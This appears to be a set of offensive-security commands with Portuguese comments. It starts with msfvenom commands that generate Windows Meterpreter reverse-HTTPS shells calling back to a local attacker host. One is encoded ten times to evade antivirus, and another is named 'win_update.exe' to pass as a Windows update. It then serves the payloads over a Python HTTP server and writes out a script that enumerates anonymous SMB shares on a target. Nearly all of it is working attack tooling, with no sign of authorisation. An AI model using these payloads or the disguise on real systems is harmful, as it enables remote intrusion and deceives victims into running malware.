msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Criando um script Python para enumerar automaticamente shares SMB abertos no alvo usando smbclient e smbmap

script_enum_smb = """
import subprocess

ip_alvo = "192.168.1.84"  # IP alvo

print(f"Iniciando enumeração de shares SMB no host {ip_alvo}...\\n")

# Primeiro, tentamos uma enumeração com smbclient (sem senha)
print("Tentando listar shares com smbclient (acesso anônimo)...")
smbclient_proc = subprocess.run(["smbclient", "-L", ip_alvo, "-N"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
print(smbclient_proc.stdout)

# Agora, utilizamos o smbmap para tentar descobrir permissões automaticamente
print("\\nExecutando smbmap para mapear shares e permissões:")
smbmap_proc = subprocess.run(["smbmap", "-H", ip_alvo], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
print(smbmap_proc.stdout)

print("\\nEnumeração de SMB concluída.")
"""

with open("/mnt/data/enum_smb_shares.py", "w") as f:
    f.write(script_enum_smb)

print("Script pronto criado como 'enum_smb_shares.py'.")





